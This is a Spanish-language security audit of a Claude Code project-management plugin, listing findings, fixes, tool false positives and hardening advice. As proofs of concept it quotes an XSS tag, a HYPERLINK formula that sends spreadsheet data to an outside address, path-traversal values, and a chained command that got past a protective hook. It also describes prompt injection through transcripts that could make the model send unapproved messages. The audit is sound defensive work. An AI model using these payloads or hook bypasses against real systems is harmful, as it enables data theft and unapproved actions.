# Seguridad de pm-method · revisión del 2026-10-20 y de los scripts de 2.4.0

Revisión de seguridad del plugin pm-method 2.3.0 desde el punto de vista de quien lo
instala: si las skills, los agentes, los hooks y los scripts introducen riesgos o exponen a vulnerabilidades. La
sección 11 revisa los scripts que la versión 2.4.0 suma o amplía y que leen fuentes externas (2026-10-22): sin
hallazgos nuevos de severidad alta ni media. SEG-13 (dependencias Node de la imagen Docker) se revisó otra vez el
2026-10-27, con la versión 2.5.0.

EN: *Security review of pm-method 2.3.0. No high-severity issues. The three medium issues are fixed (HTML escaping in
the stakeholder report, formula neutralisation in the xlsx export, and a permission prompt that a person must answer
before approving or sending messages). Of the twelve low items, eleven are fixed and one is fixed in part; the remaining npm
advisories in the optional Docker image (five low, plus one high and one moderate bundled inside `npm` that no published
`npm` release fixes yet, as of 2026-10-27) are accepted with a justification; the two informational items
are accepted.*

## 1. Resultado en una tabla

| Severidad | Cantidad | Corregidos | Recomendados | Aceptados |
|---|---|---|---|---|
| Alta | 0 | — | — | — |
| Media | 3 | 3 (SEG-01, SEG-02, SEG-03) | — | — |
| Baja | 12 | 11 (SEG-04 a SEG-11, SEG-13, SEG-14, SEG-15) y SEG-12 en parte | SEG-12 (resto) | SEG-13: 5 avisos bajos y, hasta que una versión publicada de `npm` los corrija, 1 alto y 1 moderado empaquetados en `npm` (2026-10-27), justificados |
| Informativa | 2 | — | — | 2 (SEG-16, SEG-17) |

No se encontraron credenciales, tokens ni datos personales reales en el repositorio (incluidos fixtures, ejemplos y
documentación): todas las direcciones de correo son de dominios reservados para ejemplos (`example.org`, `.test`).

## 2. Alcance

| Componente | Qué se revisó |
|---|---|
| `skills/*/SKILL.md`, `skills/*/references/`, `skills/*/templates/` | instrucciones al modelo: comandos peligrosos, lectura de secretos, envío de datos afuera, seguimiento de instrucciones incrustadas en archivos; permisos (`allowed-tools`) |
| `agents/` | permisos (`tools`, `disallowedTools`) y reglas operativas |
| `hooks/` (`guardian.py`, `inicio.py`, `idioma.py`, `py.sh`, `hooks.json`) | se ejecutan en cada sesión, pedido o uso de Bash/Write/Edit: qué leen, qué imprimen, si bloquean o filtran datos |
| `skills/*/scripts/*.py` | núcleo (`estado.py`, `registro.py`, `esquema.py`, `sanidad.py`, `puertas.py`, `exportar.py`, `cpm.py`, `wbs.py`…), `pm-integraciones/scripts/envios.py` (SMTP, webhooks, MCP), `pm-bmad-puente/scripts/bmad.py`, `pm-riesgos/scripts/riesgos.py`, `pm-reuniones/scripts/transcripcion.py`, `pm-interesados/scripts/interesados.py` (reporte HTML), `pm-exportar/scripts/paquete.py`, `pm-okr/scripts/okr.py` |
| Plantillas HTML | `pm-visuales/templates/tablero-avance.html` y `canvas-arranque.html` |
| `scripts/` | `validar_paquete.py`, `probar_paquete.py`, `instalar_hermes.py`, `pruebas_vivo/`, `webinar/generar.py` y `webinar/pptx.js` |
| `.claude-plugin/`, `.gitignore` | manifiestos y exclusiones |
| `docker/` | entorno Docker opcional: solo auditoría de dependencias |

Fuera de alcance: `docs/guias/`, `docs/webinar/` y `scripts/pruebas/guias_e2e/` (solo se buscaron secretos y datos
personales), los servidores MCP y las skills de terceros (no forman parte del paquete) y Claude Code mismo.

## 3. Método y herramientas

Entorno: Linux, Python 3.13.16, Claude Code 2.1.304, openpyxl 3.1.5.

| Herramienta | Versión | Uso |
|---|---|---|
| bandit | 1.9.4 | análisis estático de todo el Python del repositorio (8.707 líneas; excluidas las tres carpetas fuera de alcance) |
| semgrep | 1.181.0 | reglas comunitarias `semgrep-rules` (commit `17e31e1`, 2026-10-15) de `python`, `javascript`, `generic/secrets` y `ai`, ejecutadas sin conexión al registro de semgrep. No pudo analizar `bmad.py`, `interesados.py` ni `riesgos.py` (error de su analizador sintáctico, "int_of_string" en la línea 1) y agotó el tiempo en `probar_paquete.py`; esos archivos quedaron cubiertos por bandit y por la revisión manual |
| pip-audit | 2.10.1 | `docker/requirements.txt` (dependencias fijadas por hash): sin vulnerabilidades conocidas |
| npm audit | npm 10.9.4 | `docker/node/package-lock.json` (copia en una carpeta aparte, sin instalar ni ejecutar nada) |
| Revisión manual | — | lectura de hooks, agentes, scripts y plantillas; búsqueda con expresiones regulares de `shell=True`, `os.system`, `eval`/`exec`, `pickle`, `yaml.load`, `urlopen`, rutas, escapado HTML, correos, teléfonos, tokens (Slack, GitHub, AWS, Anthropic, OpenAI, Google, JWT, claves privadas, URLs de webhooks) |
| Pruebas de concepto | — | cada hallazgo confirmado se reprodujo en una carpeta temporal; los corregidos tienen prueba de regresión en `scripts/probar_paquete.py` (caso S para SEG-01 y SEG-02; caso N para SEG-03 a SEG-10) |

No se ejecutó código de terceros: las reglas de semgrep son archivos de datos y el lockfile de npm se auditó sin instalar.

## 4. Modelo de amenazas (breve)

- **Activos**: la carpeta del proyecto (estado de gobierno, registros CSV, decisiones de junta), datos personales de
  interesados (`stakeholders.csv`, valoraciones), credenciales de los canales (`PM_SMTP_*`, URLs de webhooks) y la
  reputación de quien envía comunicaciones en nombre del proyecto.
- **Entradas no confiables**: transcripciones, instantáneas de Jira u otros trackers, artefactos BMAD, documentos
  externos y, en menor medida, un repositorio clonado de terceros (su `estado.json` o sus registros).
- **Quién actúa**: el modelo ejecuta los scripts con los permisos de la persona; una instrucción incrustada en una
  entrada no confiable (inyección de instrucciones) es la vía más realista de abuso.
- **Límites de confianza**: los permisos de Claude Code (aprobación de Bash, Write y herramientas MCP), los hooks del
  plugin (que son controles de integridad del método, no una frontera de seguridad) y las validaciones de los scripts.
- **Lo que el paquete no hace**: no abre puertos, no descarga código, no llama a red salvo `envios.py` con
  `--confirmar` (SMTP o webhook configurados por la persona), no lee archivos fuera de las rutas que recibe y no
  guarda credenciales.

## 5. Hallazgos

Estado: **corregido** (arreglado, con prueba de regresión cuando cambia una conducta), **recomendado** (queda
documentado para una próxima versión) o **aceptado** (riesgo conocido por diseño).

### Media

**SEG-01 · XSS en el reporte HTML de interesados · corregido**
`skills/pm-interesados/scripts/interesados.py:686` (`tabla()`). Toda celda cuyo texto empezaba con `<` se insertaba
sin escapar, para poder pasar fragmentos HTML propios. Un dato de los registros que empezara con `<` (nombre o
expectativas de un interesado, asunto de un envío, descripción de una fila RACI, horario o "evitar" de una preferencia
propuesta desde una transcripción) quedaba como HTML activo. Prueba de concepto: un interesado con nombre
`<img src=x onerror=alert(1)>` y `reporte --html … --restringido` producía la etiqueta `<img src=x` tal cual en el
archivo. El reporte se abre en el navegador y se comparte con la junta. Corrección: los fragmentos propios se marcan
con la clase `HtmlSeguro` y todo lo demás se escapa siempre (también el atributo `class` y el valor de cada dimensión
del perfil, línea 735). Prueba: `SEG-01` en `probar_paquete.py`.

**SEG-02 · Inyección de fórmulas en la exportación a Excel · corregido**
`skills/pm-estado-proyecto/scripts/exportar.py:91-96` (`csv_a_xlsx`). openpyxl convierte en fórmula todo texto que
empieza con `=`. Un registro alimentado desde Jira, una transcripción o BMAD con un texto como
`=HYPERLINK("http://…/?d="&A1,"ver")` o `=WEBSERVICE(…)` se convertía en una fórmula viva en el `.xlsx` del paquete de
puerta, capaz de enviar el contenido de otras celdas a un tercero al abrirlo. Corrección: esas celdas se guardan como
texto (el valor no cambia; Excel lo muestra tal cual). Los textos que empiezan con `+`, `-` o `@` ya se guardaban como
texto. Prueba: `SEG-02`.

**SEG-03 · La aprobación humana antes de enviar dependía de un procedimiento · corregido**
`skills/pm-integraciones/scripts/envios.py` y `hooks/guardian.py`. `envios.py aprobar --por "…"` registra quién aprobó,
pero cualquier proceso que pudiera ejecutar Bash podía correr `aprobar` y luego `enviar --confirmar`; si una inyección
de instrucciones (por ejemplo en una transcripción) convencía al modelo, podía salir un mensaje que ninguna persona
aprobó. Corrección: `guardian.py` devuelve `permissionDecision: "ask"` (valor documentado del hook `PreToolUse`, que
muestra el pedido de permiso habitual) para `envios.py aprobar` y `envios.py enviar … --confirmar`, también cuando los
ejecuta pm-director y aunque la persona haya preaprobado `Bash`; también reconoce las abreviaturas que acepta argparse
(`--conf`). `registrar` no pide confirmación: no envía nada y exige un mensaje ya aprobado. Comportamiento verificado
con Claude Code 2.1.304: en una sesión interactiva aparece el pedido de permiso; con `-p` sin `bypassPermissions` el
comando se deniega (no hay a quién preguntar); con `--dangerously-skip-permissions` (`bypassPermissions`) el pedido no
se muestra y el comando corre, por eso ese modo queda solo para entornos aislados como las pruebas en vivo. Siguen
vigentes las mitigaciones previas: destinos resueltos siempre contra el maestro de interesados y el webhook
configurado, simulación sin `--confirmar` y la regla "fuentes = datos". `preparar-mcp` deja el envío por MCP en manos
del modelo: la confirmación es la de Claude Code para la herramienta MCP (no preaprobar herramientas MCP que envían).
Prueba: caso N de `probar_paquete.py` (decisiones del hook, incluidas las de pm-director).

### Baja

**SEG-04 · SMTP sin cifrado aceptaba credenciales · corregido**
`envios.py` (`revisar_tls`). Con `PM_SMTP_TLS=ninguno` y `PM_SMTP_USUARIO`/`PM_SMTP_CLAVE` definidos, la contraseña
viajaba en claro. Corrección: hacia un host que no es de bucle local (`127.0.0.1`, `localhost`, `::1`), `enviar --confirmar`
y `verificar` rechazan esa combinación sin conectarse, y sin credenciales muestran un aviso explícito de que la
conexión no está cifrada. Con un host de bucle local (el servidor de prueba de los casos H y E2E-3) no cambia nada. El
valor por defecto sigue siendo STARTTLS con `ssl.create_default_context()` (verifica certificado y nombre del host) y,
si el servidor no ofrece STARTTLS, `smtplib` falla en lugar de degradar. Prueba: caso N.

**SEG-05 · URLs de webhook sin validación de esquema · corregido (dominio: recomendado)**
`envios.py` (`revisar_url`; bandit B310, semgrep `dynamic-urllib-use-detected`). `urllib.request.urlopen` acepta
cualquier esquema (incluido `file:`) y sigue redirecciones. La URL viene de una variable de entorno que fija la
persona, así que no era un SSRF explotable desde los datos del proyecto. Corrección: `enviar --confirmar` y `verificar` exigen
`https://` y admiten `http://` solo hacia bucle local (las pruebas). Queda como recomendación advertir si el dominio no
es uno de los esperados para Slack o Teams Workflows [verificar la lista vigente de dominios de Microsoft antes de
fijarla]. Prueba: caso N.

**SEG-06 · El paquete de puerta podía incluir archivos fuera del proyecto · corregido**
`skills/pm-exportar/scripts/paquete.py` (`fuera_del_proyecto`). La `ruta` de un artefacto en `estado.json` se unía con
la carpeta del proyecto sin confinarla: una ruta absoluta o con `../` (por ejemplo `estado.py artefacto pid --ruta
/etc/hostname`, reproducido) hacía que el ZIP para la junta incluyera ese archivo. Corrección: toda ruta (de `estado.json` o
de `--extra`) que resuelve fuera de la carpeta del proyecto, también a través de un enlace simbólico, se excluye: el
manifiesto la lista como "EXCLUIDO: fuera del proyecto" con una nota al pie y la salida lo informa; si el artefacto es
obligatorio, el paquete queda `-BORRADOR`. Para incluirla a propósito (por ejemplo `../docs/x.md` cuando la carpeta de
gestión vive dentro del repositorio del producto) se vuelve a generar con `--permitir-externos`. `estado.py artefacto`
avisa al registrar una ruta así. Prueba: caso N.

**SEG-07 · El nombre del artefacto podía sacar la copia congelada de `historial/` · corregido**
`skills/pm-estado-proyecto/scripts/estado.py` (`validar_clave`, `aprobar`). `estado.py aprobar <nombre>` armaba el
destino de la copia congelada con el nombre sin validar: con `../../../fuera` se escribió `fuera-v0.1.md` fuera del
proyecto (reproducido). Corrección: `artefacto` y `aprobar` aceptan solo claves con letras, dígitos, `.`, `_` y `-`, sin `..`
ni `/`, y `aprobar` además comprueba que la copia (clave + versión) quede dentro de `00-direccion/historial/`; si no,
termina con error sin escribir nada. Prueba: caso N.

**SEG-08 · Registros CSV abiertos directamente en una planilla · corregido (documentación)**
`skills/pm-estado-proyecto/scripts/esquema.py:276` (`escribir_csv`) y los derivados de `bmad.py` (por ejemplo
`requisitos-bmad.csv`, línea 459). Un texto que empiece con `=`, `+`, `-` o `@` traído de Jira, transcripciones o BMAD
queda tal cual en el CSV; si alguien abre el CSV con doble clic en Excel o LibreOffice, se interpreta como fórmula. La
exportación oficial a `.xlsx` ya lo neutraliza (SEG-02). Corrección (documental): la guía de registros
(`pm-registros/templates/guia-registros.md`) indica abrir los CSV con `exportar.py xlsx` o importándolos con todas las
columnas como texto. Neutralizar en `registro.py` (prefijo `'`) alteraría los datos y no se hizo. Queda como
recomendación una advertencia de `sanidad.py` para celdas que empiezan con `=`.

**SEG-09 · `guardian.py` eximía el comando entero si mencionaba un script del paquete · corregido (sigue siendo un control de integridad)**
`hooks/guardian.py` (`segmentos`, `invoca_script`, `revisar_bash`). Si el comando de Bash mencionaba en cualquier parte
uno de los scripts del paquete, se omitía la comprobación de destinos protegidos para el comando entero: `python3
envios.py --help; echo {} > gestion/estado.json` se permitía (reproducido). Corrección: el comando se divide en segmentos
(`;`, `&&`, `||`, `|`, `&` y saltos de línea, respetando comillas) y solo queda exento el segmento que **ejecuta** un
script del paquete (no el que lo menciona, como `cp x/estado.py gestion/estado.json`); las redirecciones (`>`, `>>`,
`&>`, `tee`) hacia un archivo protegido se deniegan también desde ese segmento. Las opciones reservadas a pm-director se
reconocen aunque se abrevien (`--forz`). Sigue siendo un control de integridad del método frente a errores del modelo,
no una frontera de seguridad frente a un actor malicioso: ante un error propio no decide (falla abierto) y no cubre
otras formas de escribir (un script en un archivo, `perl -i`, `dd`); así lo dice su cabecera. Prueba: caso N
(ejemplos de este hallazgo) y caso D sin cambios (36/36).

**SEG-10 · El aviso de inicio de sesión copiaba texto de `estado.json` sin recortar · corregido**
`hooks/inicio.py` (`linea`). El nombre del proyecto, la fase y los mensajes de sanidad del `estado.json` encontrado en
la carpeta de trabajo (hasta dos niveles) entran al contexto en cada inicio de sesión; un repositorio de terceros con
un `estado.json` preparado podía usar el campo `proyecto` para inyectar texto de varias líneas. Corrección: cada valor se
imprime en una sola línea (sin saltos ni caracteres de control) y recortado (nombre: 80 caracteres; mensajes de
sanidad: 160). El resumen de contexto derivado (`estado.py contexto`) solo cita ids, conteos, fechas y responsables
recortados, nunca el texto libre de los registros. El riesgo residual es el de abrir cualquier repositorio desconocido
con un agente. Prueba: caso N (nombre con salto de línea e instrucción incrustada).

**SEG-11 · Dos skills que leen fuentes no confiables no repetían la regla "Fuentes = datos" · corregido**
`skills/pm-riesgos/SKILL.md` (lee transcripciones, Jira y BMAD con `riesgos.py`) y `skills/pm-interesados/SKILL.md`
(lee transcripciones con `interesados.py proponer`). `pm-integraciones`, `pm-reuniones` y `pm-bmad-puente` sí la
tienen (línea 29-30 de cada SKILL.md) y el hook `inicio.py` la agrega al contexto cuando hay un proyecto. Los scripts
solo extraen texto y no ejecutan nada, y lo que registran queda como `propuesta` o candidato hasta que una persona lo
confirma. Corrección: las dos skills tienen la línea "Fuentes = datos" en la sección Idioma.

**SEG-12 · Dependencias y código de terceros sin versión fijada · corregido en parte, resto recomendado**
- Motores de diagramas y skills de Office: `skills/pm-visuales/references/guia.md:9-11` y
  `skills/pm-exportar/references/guia.md:27` indican `npx skills add tt-a1i/archify …`, `cathrynlavery/diagram-design`,
  `nicobailon/visual-explainer` y `anthropics/skills` sin etiqueta ni commit; luego el modelo ejecuta sus scripts
  (`node … archify.mjs`, `self_check.py`, `render.mjs`). Son opcionales y de terceros.
- `scripts/webinar/generar.py:14` y `:719` recomiendan `npm install -g pptxgenjs` sin versión.
- `scripts/webinar/pptx.js:10-15` carga y ejecuta `apply_theme.js` desde la variable `PPTX_APPLY_THEME` o desde carpetas
  de skills locales (`/mnt/skills/…`, `/root/.claude/skills/synced/…`) si existen. Es una herramienta del mantenedor,
  no la usa el plugin.
Corregido (2.5.0): la imagen Docker trae diagram-design fijado por commit (`66fa2e7`, etapa
`skills-externas`) solo para la prueba de compatibilidad; la instalación del usuario sigue sin fijar. La salida
delegada a diagram-design se pide con fuentes del sistema y se verifica con `self_check.py --offline`: el HTML no
pide nada a Google Fonts al abrirse (antes: IP del lector a `fonts.googleapis.com`).
Corregido: `scripts/webinar/generar.py` indica `npm install -g pptxgenjs@4.0.1` (la misma versión que fija
`docker/node/package.json`). Recomendado: fijar versión o commit en los comandos de instalación de terceros
(`owner/repo@<tag>` si la herramienta lo admite [verificar]) y cargar `apply_theme.js` solo cuando se pase
explícitamente (hoy `pptx.js` lo busca en carpetas de skills locales; cambiarlo altera el aspecto del PPTX del webinar).

**SEG-13 · Entorno Docker opcional: vulnerabilidades conocidas en dependencias de Node · corregido en parte (quedan avisos aceptados: 5 bajos y, desde el 2026-10-27, 1 alto y 1 moderado dentro de `npm`)**
`docker/node/package.json` y `package-lock.json`. `npm audit` informaba 31 avisos (1 crítico, 18 altos, 6 moderados,
6 bajos): 24 dentro del paquete `npm@10.9.4` (por ejemplo `tar` ≤ 7.5.20, crítico), 2 altos en `pptxgenjs@4.0.1` por
`image-size` 1.2.1 y 5 bajos en la cadena de `@mermaid-js/mermaid-cli`.

- `npm`: `npm ls npm` confirma que ninguna otra dependencia lo pide; está en la lista solo para que el contenedor tenga
  `npm` y `npx` (instalar BMAD o skills externas, [DOCKER §5.4](DOCKER.md)), porque el `nodejs` de Ubuntu no los trae. Se
  subió a `npm@11.21.1`, la versión que `npm audit` indica como corrección (11.21.0 todavía arrastra avisos altos).
- `image-size`: `pptxgenjs` 4.0.1 lo declara como dependencia, pero su código distribuido no lo usa (la única mención es
  una función comentada). Se fija `image-size@2.0.3` (corregida) con `overrides` en `package.json`; la generación de
  los PPTX del webinar con imágenes se verificó dentro de la imagen.
- Resultado: `npm audit --package-lock-only` → **0 críticos, 0 altos, 0 moderados, 5 bajos**. Los cinco son una misma
  cadena: `katex` < 0.18.2 (GHSA-238p-pmpm-9mq7), que llega por `mermaid` → `@mermaid-js/layout-elk`,
  `@mermaid-js/layout-tidy-tree` → `@mermaid-js/mermaid-cli`. Se aceptan: KaTeX solo procesa fórmulas matemáticas de los
  diagramas Mermaid, que en este contenedor son los del propio repositorio y los que generan sus scripts; la corrección
  que propone `npm audit` es bajar a `mermaid-cli` 11.14.0 (cambio de versión mayor de la cadena), que no se aplica.
- **Revisión del 2026-10-27 (versión 2.5.0).** Con el mismo lockfile, `npm audit --package-lock-only` suma **1 alto y 1
  moderado** en dependencias que `npm` 11.21.1 trae empaquetadas (`bundleDependencies`, a las que `overrides` no
  llega): `undici` 6.29.0 (altos GHSA-2m5v-pch6-74hx, GHSA-xjj6-f33q-929c y GHSA-qrxm-fqhp-jwvm; moderados
  GHSA-4qv8-2p9j-2685 y GHSA-9fm3-97px-rjf6; corregidos en `undici` 6.29.1) e `ip-address` 10.7.2 (GHSA-rxp7-6hxx-x8q5,
  moderado; corregido en 10.7.4). **Ninguna versión publicada de `npm` los corrige todavía**: `npm view npm versions`
  muestra 11.21.1 como la última de la serie 11 y 12.2.1 como `latest` (ambas del 2026-10-15); con el lockfile
  regenerado (`npm install --package-lock-only`) para 12.0.0, 12.1.0, 12.2.0 y 12.2.1, todas traen `undici` ≤ 6.29.0 e
  `ip-address` ≤ 10.7.2 (12.2.1 da el mismo resultado que 11.21.1; las anteriores, más avisos). La serie 12 exige además
  Node.js `^22.22.2 || ^24.15.0 || >=26.0.0` y la imagen tiene el 22.22.1 de Ubuntu 26.04 (`resolute`, sin
  actualización en `-updates` ni `-security` al 2026-10-27). Se mantiene `npm` 11.21.1 y los dos avisos se **aceptan
  temporalmente**:
  - `undici` solo lo usa `node-gyp` (empaquetado en `npm`) en `lib/download.js`, para descargar las cabeceras de Node al
    compilar un complemento nativo durante una instalación. La imagen no trae compilador de C/C++ ni `make`, así que
    esa compilación no puede completarse; las descargas de paquetes de `npm` y `npx` usan otro cliente
    (`@npmcli/agent`).
  - `ip-address` llega por `socks` → `socks-proxy-agent`, que `@npmcli/agent` solo usa con un proxy `socks://`.
  - `npm` solo sirve dentro del contenedor para `npx` (BMAD y skills externas, [DOCKER §5.4](DOCKER.md)); las pruebas, los
    scripts de pm-method y los generadores no lo usan.
  - Acción: subir `npm` a la primera versión publicada que traiga `undici` ≥ 6.29.1 e `ip-address` ≥ 10.7.4 (y sea
    compatible con el Node de la imagen), regenerar el lockfile, comprobar `npm audit` y reconstruir.
  - **Estado al 2026-10-27, al cerrar la versión 2.5.0: sin corrección publicada; se mantiene `npm` 11.21.1 y los dos
    avisos siguen aceptados temporalmente.** `npm view npm time` no muestra versiones posteriores a 11.21.1 (serie 11) y
    12.2.1 (`latest`), ambas del 2026-10-15; con el lockfile regenerado para cada una (`npm install --package-lock-only`
    sobre una copia de `docker/node/`), `npm audit --package-lock-only` da lo mismo: `undici` 6.29.0 e `ip-address`
    10.7.2 empaquetados, 1 alto, 1 moderado y los 5 bajos de la cadena de `mermaid-cli`. La imagen `pm-method:2.5.0` se
    construyó con el lockfile sin cambios ([DOCKER §10](DOCKER.md#10-verificación-registrada)).
- `docker/requirements.txt` (Python) sigue fijado por hash y sin avisos (`pip-audit`).
- Antes de publicar una imagen: `cd docker/node && npm audit --package-lock-only` sin avisos críticos ni altos, salvo los
  aceptados aquí con justificación.

**SEG-14 · Plantillas HTML completadas por el modelo · corregido (guía)**
- `skills/pm-visuales/templates/canvas-arranque.html`: los `{{marcadores}}` los completa el modelo con texto del brief
  y la guía no pide escapar `&`, `<` y `>`.
- `skills/pm-visuales/references/guia.md:74`: el bloque JSON del tablero escapa `</` (correcto) y el JavaScript de la
  plantilla usa `textContent` (sin `innerHTML`); falta escapar también `<!--`, que en un bloque `<script>` puede
  alterar el análisis del HTML.
Corrección: la guía de `pm-visuales` pide escapar cada valor del canvas (`html.escape`) y arma el bloque del tablero
con `json.dumps(datos, ensure_ascii=False).replace("<", "\\u003c")`, que neutraliza tanto `</script>` como `<!--`.

**SEG-15 · `.gitignore` no excluía archivos de credenciales · corregido**
`.gitignore`. Las credenciales de los canales van en variables de entorno, y es habitual guardarlas en un `.env`;
`.dockerignore` excluía `.env`, `*.pem`, `*.key` y `.npmrc`. Corrección: `.gitignore` excluye también `.env`, `.env.*`,
`*.pem`, `*.key` y `.claude/settings.local.json`.

### Informativa (aceptada)

**SEG-16 · Los agentes heredan todas las herramientas de la sesión · aceptado**
`agents/*.md`: sin campo `tools` (solo `disallowedTools: Agent`), así que los subagentes pueden usar Bash, Write y los
MCP conectados (también los que escriben en Jira, Slack o correo). Es una decisión de diseño documentada en
`CLAUDE.md` para que hereden los MCP; los límites los ponen los permisos de Claude Code y las reglas "escritura externa
solo con vista previa y confirmación". Ninguna skill declara `allowed-tools`, es decir, ninguna preaprueba
herramientas.

**SEG-17 · En Hermes y en instalaciones manuales no corren los hooks · aceptado**
`scripts/instalar_hermes.py` no copia `hooks/` (Hermes no los ejecuta). Las protecciones de `guardian.py` (separación
de roles, escritura solo por scripts) y el aviso de `inicio.py` no existen ahí; quedan las reglas escritas en agentes y
skills y las validaciones de los scripts. Documentado en `docs/INSTALACION.md` (sección de Hermes: "no copia los
hooks").

## 6. Falsos positivos y avisos de las herramientas

| Herramienta · regla | Dónde | Por qué no es un hallazgo |
|---|---|---|
| bandit B603, B404, B607; semgrep `dangerous-subprocess-use-audit`, `dangerous-subprocess-use-tainted-env-args` | `hooks/inicio.py:19`, `puertas.py:87`, `exportar.py:38`, `probar_paquete.py`, `pruebas_vivo/`, `validar_mermaid.py`, `webinar/generar.py`, `docs/informe/fuente/extraer.py` | siempre lista de argumentos, sin `shell=True`; el ejecutable es `sys.executable`, `mmdc`, `node` o `npm` y los argumentos son rutas propias |
| semgrep `hooks-path-traversal-python`, `hooks-sensitive-file-access-python` (reglas `ai`) | 28 + 27 lugares (`sanidad.py`, `esquema.py`, `paquete.py`, `idioma.py`, `inicio.py`…) | heurística que marca todo `open()` con ruta variable; las rutas son del proyecto que se pasa con `--proyecto`. Los dos casos reales de rutas están en SEG-06 y SEG-07 |
| semgrep `detect-generic-ai-anthprop` (722, INFO) | Markdown y JSON | detecta menciones de "Claude"/"Anthropic"; es documentación |
| bandit B318/B408, semgrep `use-defused-xml` | `scripts/probar_paquete.py:65` | la prueba analiza el XML que acaba de generar `cpm.py`, no una entrada externa |
| bandit B102, semgrep `exec-detected` | `docs/informe/fuente/build_html.py:188` | herramienta del mantenedor que ejecuta un archivo del propio repositorio (`cuerpo_html.py`); no forma parte del plugin |
| bandit B310 | `envios.py:137` | real pero de severidad baja: ver SEG-05 |
| bandit B110, B112 | hooks y scripts | `try/except: pass` intencional: los hooks no deben romper la sesión (ver SEG-09 sobre fallar abierto) |
| bandit B311 | `pruebas_vivo/escenarios.py`, `pruebas/generar_bmad_grande.py` | `random` para generar datos de prueba, sin uso criptográfico |
| semgrep `use-defusedcsv` | `pm-okr/scripts/okr.py:263` | solo escribe la fila de encabezados de la plantilla |
| semgrep `arbitrary-sleep`, `default-mutable-dict`, `return-not-in-function`, `useless-literal`, `unspecified-open-encoding`, `detect-non-literal-fs-filename` | varios | calidad de código, sin impacto de seguridad |

## 7. Lo que ya está bien (verificado)

- Sin `shell=True`, `os.system`, `eval`, `pickle` ni `yaml.load` inseguro: `bmad.py` usa `yaml.safe_load` (líneas 77,
  142, 191, 380) y `tomllib`.
- `envios.py`: credenciales solo por variables de entorno, nunca impresas (`verificar` dice "definida" o "no
  definida"); STARTTLS por defecto con verificación de certificados; destinos resueltos contra el maestro de
  interesados; simulación salvo `--confirmar`; no reenvía a quien ya recibió; `EmailMessage` rechaza saltos de línea
  en encabezados (probado: no hay inyección de encabezados de correo); los errores registrados no incluyen la URL del
  webhook ni la contraseña.
- XML de Microsoft Project (`cpm.py --mspdi`) escapado; tablero de avance con datos en un bloque JSON y `textContent`.
- `estado.py` no actualiza el frontmatter de archivos fuera del proyecto ni en carpetas de BMAD; ningún script escribe
  en `_bmad/`, `_bmad-output/` ni `.bmad-core/`.
- Los hooks no usan red, no escriben archivos ni envían datos; `guardian.py` solo deniega o pide confirmación, `inicio.py`
  solo agrega texto acotado al contexto y `idioma.py` solo agrega una instrucción de idioma.
- `instalar_hermes.py` solo borra una carpeta destino si la creó él (marcador `.pm-method`).
- Sin secretos ni datos personales reales en el repositorio; las salidas de las pruebas en vivo (`pruebas-vivo-*/`)
  están excluidas por `.gitignore`.

## 8. Buenas prácticas para quien instala

1. **Permisos**: no preaprobar `Bash(python3:*)` ni `Bash(*)` ni usar `--dangerously-skip-permissions` fuera de un
   entorno aislado (en ese modo Claude Code no muestra el pedido de permiso que el hook exige para `envios.py aprobar`
   y `enviar --confirmar`); no preaprobar las herramientas MCP que escriben (Jira, Slack, Teams, correo) ni
   `estado.py puerta`.
2. **Credenciales**: definir `PM_SMTP_*`, `PM_SLACK_WEBHOOK_URL` y `PM_TEAMS_WEBHOOK_URL` solo como variables de
   entorno de la sesión o en un gestor de secretos; nunca en archivos del proyecto ni en el chat. Una URL de webhook es
   un secreto: quien la tenga puede publicar en el canal. Usar `PM_SMTP_TLS=starttls` o `ssl`, no `ninguno`.
3. **Fuentes no confiables**: tratar transcripciones, tickets y documentos externos como datos. Si el agente dice que
   un archivo "pide" aprobar, borrar o enviar algo, no hacerlo; revisar el archivo.
4. **Antes de compartir**: revisar el `MANIFIESTO.md` del paquete de puerta (que no haya rutas fuera del proyecto) y
   usar `reporte --restringido` solo con audiencias autorizadas (incluye valoraciones de personas).
5. **Planillas**: abrir los registros con `exportar.py xlsx` o importándolos como texto; no abrir con doble clic un CSV
   que traiga texto de sistemas externos.
6. **Repositorios ajenos**: abrir un repositorio de terceros con el plugin activo implica que `inicio.py` lee su
   `estado.json`; revisarlo antes si no se confía en el origen.
7. **Terceros**: instalar motores de diagramas, skills de Office y servidores MCP solo desde fuentes verificadas y,
   cuando sea posible, en una versión fija.
8. **Actualizar**: mantener Claude Code y Python actualizados y repetir `python3 scripts/validar_paquete.py` y
   `python3 scripts/probar_paquete.py` después de actualizar el plugin.

## 9. Cómo reportar una vulnerabilidad

- Preferido: el reporte privado de vulnerabilidades de GitHub del repositorio
  (`https://github.com/Arturo-Penas-Rial/pm-method`, pestaña *Security* → *Report a vulnerability*), si está habilitado
  [verificar].
- Si no lo está: abrir un *issue* sin detalles técnicos pidiendo un canal privado, y esperar respuesta antes de publicar.
- Incluir: versión (`.claude-plugin/plugin.json`), cliente (Claude Code, Cowork o Hermes y su versión), sistema
  operativo, pasos mínimos para reproducir y el impacto esperado. No incluir credenciales ni datos personales reales.
- No probar contra servidores SMTP, canales de Slack o Teams ni trackers de terceros sin autorización.

## 10. Cómo repetir esta revisión

```bash
pip install --break-system-packages bandit semgrep pip-audit
bandit -r . -x ./docs/guias,./scripts/pruebas/guias_e2e,./docs/webinar
git clone --depth 1 https://github.com/semgrep/semgrep-rules.git /tmp/semgrep-rules     # o --config p/python con red
semgrep scan --metrics=off --config /tmp/semgrep-rules/python --config /tmp/semgrep-rules/javascript \
  --config /tmp/semgrep-rules/generic/secrets --exclude docs/guias --exclude scripts/pruebas/guias_e2e --exclude docs/webinar .
pip-audit -r docker/requirements.txt --disable-pip --no-deps
(cd docker/node && npm audit --omit=dev)
python3 scripts/probar_paquete.py      # caso S: SEG-01 y SEG-02 · caso N: SEG-03 a SEG-10
```

## 11. Scripts de la versión 2.4.0 que leen fuentes externas (2026-10-22)

Alcance: `pm-reuniones/scripts/extraccion.py` (transcripciones), `pm-lecciones-aprendidas/scripts/lecciones.py`
(carpetas de otros proyectos e índices CSV), `pm-riesgos/scripts/riesgos.py opciones` (hojas de opciones),
`pm-issues-cambios/scripts/impacto.py`, `pm-agil-hibrido/scripts/release.py`, `estado.py radar|briefing|periodo|productos`
y `pm-exportar/scripts/paquete.py auditoria|verificar`. Método: bandit 1.9.4 sobre esos archivos (y `cpm.py` e
`interesados.py`), búsqueda de `shell=True`, `os.system`, `eval`/`exec`, `pickle` y `yaml.load`, lectura del código que
escribe registros o HTML y las pruebas de regresión que lo ejercitan.

| Tema | Resultado | Prueba |
|---|---|---|
